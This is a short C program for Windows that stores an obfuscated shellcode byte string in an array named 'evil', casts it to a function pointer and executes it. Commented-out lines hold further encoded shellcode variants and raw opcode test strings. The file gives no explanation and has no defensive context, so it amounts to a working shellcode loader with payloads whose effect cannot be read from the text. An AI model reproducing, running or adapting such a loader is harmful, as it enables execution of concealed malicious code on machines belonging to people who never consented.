#include <stdio.h>
#include <windows.h>

char evil[] = "\xdb\xc3\xd9\x74\x24\xf4\xbe\xe8\x5a\x27\x13\x5f\x31\xc9\xb1\x33\x31\x77\x17\x83\xc7\x04\x03\x9f\x49\xc5\xe6\xa3\x86\x80\x09\x5b\x57\xf3\x80\xbe\x66\x21\xf6\xcb\xdb\xf5\x7c\x99\xd7\x7e\xd0\x09\x63\xf2\xfd\x3e\xc4\xb9\xdb\x71\xd5\x0f\xe4\xdd\x15\x11\x98\x1f\x4a\xf1\xa1\xd0\x9f\xf0\xe6\x0c\x6f\xa0\xbf\x5b\xc2\x55\xcb\x19\xdf\x54\x1b\x16\x5f\x2f\x1e\xe8\x14\x85\x21\x38\x84\x92\x6a\xa0\xae\xfd\x4a\xd1\x63\x1e\xb6\x98\x08\xd5\x4c\x1b\xd9\x27\xac\x2a\x25\xeb\x93\x83\xa8\xf5\xd4\x23\x53\x80\x2e\x50\xee\x93\xf4\x2b\x34\x11\xe9\x8b\xbf\x81\xc9\x2a\x13\x57\x99\x20\xd8\x13\xc5\x24\xdf\xf0\x7d\x50\x54\xf7\x51\xd1\x2e\xdc\x75\xba\xf5\x7d\x2f\x66\x5b\x81\x2f\xce\x04\x27\x3b\xfc\x51\x51\x66\x6a\xa7\xd3\x1c\xd3\xa7\xeb\x1e\x73\xc0\xda\x95\x1c\x97\xe2\x7f\x59\x67\xa9\x22\xcb\xe0\x74\xb7\x4e\x6d\x87\x6d\x8c\x88\x04\x84\x6c\x6f\x14\xed\x69\x2b\x92\x1d\x03\x24\x77\x22\xb0\x45\x52\x41\x57\xd6\x3e\xa8\xf2\x5e\xa4\xb4";

int main(int argc, char **argv)
{
    int (*shellcode)();
    shellcode = (int (*)()) evil;
    (int)(*shellcode)();
}


// char good[] = "\xd9\xec\xd9\x74\x24\xf4\xb8\x28\x1f\x44\xde\x5b\x31\xc9\xb1\x33\x31\x43\x17\x83\xeb\xfc\x03\x6b\x0c\xa6\x2b\x97\xda\xaf\xd4\x67\x1b\xd0\x5d\x82\x2a\xc2\x3a\xc7\x1f\xd2\x49\x85\x93\x99\x1c\x3d\x27\xef\x88\x32\x80\x5a\xef\x7d\x11\x6b\x2f\xd1\xd1\xed\xd3\x2b\x06\xce\xea\xe4\x5b\x0f\x2a\x18\x93\x5d\xe3\x57\x06\x72\x80\x25\x9b\x73\x46\x22\xa3\x0b\xe3\xf4\x50\xa6\xea\x24\xc8\xbd\xa5\xdc\x62\x99\x15\xdd\xa7\xf9\x6a\x94\xcc\xca\x19\x27\x05\x03\xe1\x16\x69\xc8\xdc\x97\x64\x10\x18\x1f\x97\x67\x52\x5c\x2a\x70\xa1\x1f\xf0\xf5\x34\x87\x73\xad\x9c\x36\x57\x28\x56\x34\x1c\x3e\x30\x58\xa3\x93\x4a\x64\x28\x12\x9d\xed\x6a\x31\x39\xb6\x29\x58\x18\x12\x9f\x65\x7a\xfa\x40\xc0\xf0\xe8\x95\x72\x5b\x66\x6b\xf6\xe1\xcf\x6b\x08\xea\x7f\x04\x39\x61\x10\x53\xc6\xa0\x55\xab\x8c\xe9\xff\x24\x49\x78\x42\x29\x6a\x56\x80\x54\xe9\x53\x78\xa3\xf1\x11\x7d\xef\xb5\xca\x0f\x60\x50\xed\xbc\x81\x71\x8e\x23\x12\x19\x7f\xc6\x92\xb8\x7f";
// "\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a\x1c\x39\xbd";

// "\xdb\xc3\xd9\x74\x24\xf4\xbe\xe8\x5a\x27\x13\x5f\x31\xc9\xb1\x33\x31\x77\x17\x83\xc7\x04\x03\x9f\x49\xc5\xe6\xa3\x86\x80\x09\x5b\x57\xf3\x80\xbe\x66\x21\xf6\xcb\xdb\xf5\x7c\x99\xd7\x7e\xd0\x09\x63\xf2\xfd\x3e\xc4\xb9\xdb\x71\xd5\x0f\xe4\xdd\x15\x11\x98\x1f\x4a\xf1\xa1\xd0\x9f\xf0\xe6\x0c\x6f\xa0\xbf\x5b\xc2\x55\xcb\x19\xdf\x54\x1b\x16\x5f\x2f\x1e\xe8\x14\x85\x21\x38\x84\x92\x6a\xa0\xae\xfd\x4a\xd1\x63\x1e\xb6\x98\x08\xd5\x4c\x1b\xd9\x27\xac\x2a\x25\xeb\x93\x83\xa8\xf5\xd4\x23\x53\x80\x2e\x50\xee\x93\xf4\x2b\x34\x11\xe9\x8b\xbf\x81\xc9\x2a\x13\x57\x99\x20\xd8\x13\xc5\x24\xdf\xf0\x7d\x50\x54\xf7\x51\xd1\x2e\xdc\x75\xba\xf5\x7d\x2f\x66\x5b\x81\x2f\xce\x04\x27\x3b\xfc\x51\x51\x66\x6a\xa7\xd3\x1c\xd3\xa7\xeb\x1e\x73\xc0\xda\x95\x1c\x97\xe2\x7f\x59\x67\xa9\x22\xcb\xe0\x74\xb7\x4e\x6d\x87\x6d\x8c\x88\x04\x84\x6c\x6f\x14\xed\x69\x2b\x92\x1d\x03\x24\x77\x22\xb0\x45\x52\x41\x57\xd6\x3e\xa8\xf2\x5e\xa4\xb4";

//"\xc7\x44\x24\x04\x05\x00\x00\x00\xc7\x04\x24\x44\x50\x40\x00\xe8\xde\x26\x00\x00";

//char test[] = "\x8d\x4c\x24\x04\x83\xe4\xf0\xff\x71\xfc\x55\x89\xe5\x51\x83\xec\x14\xe8\x3a\x05\x00\x00\xc7\x44\x24\x04\x05\x00\x00\x00\xc7\x04\x24\x44\x50\x40\x00\xe8\xde\x26\x00\x00\x83\xec\x08\xb8\x00\x00\x00\x00\x8b\x4d\xfc\xc3\x90\x90\x66\x90\x66\x90";
// "\xff\x71\xfc\x55\x89\xe5\x51\x83\xec\x14\xe8\x3a\x05\x00\x00\xc7\x44\x24\x04\x05\x00\x00\x00\xc7\x04\x24\x44\x50\x40\x00\xe8\xde\x26\x00\x00\x83\xec\x08\xb8\x00\x00\x00\x00\x8b\x4d\xfc";
//"\x8D\x4C\x24\x04\x83\xE4\xF0\xFF\x71\xFC\x55\x89\xE5\x51\x83\xEC\x14\xE8\x3A\x05\x00\x00\xC7\x44\x24\x04\x05\x00\x00\x00\xC7\x04\x24\x44\x50\x40\x00\xE8\xDE\x26\x00\x00\x83\xEC\x08\xB8\x00\x00\x00\x00\x8B\x4D\xFC\xC9\x8D\x61\xFC\xC3";
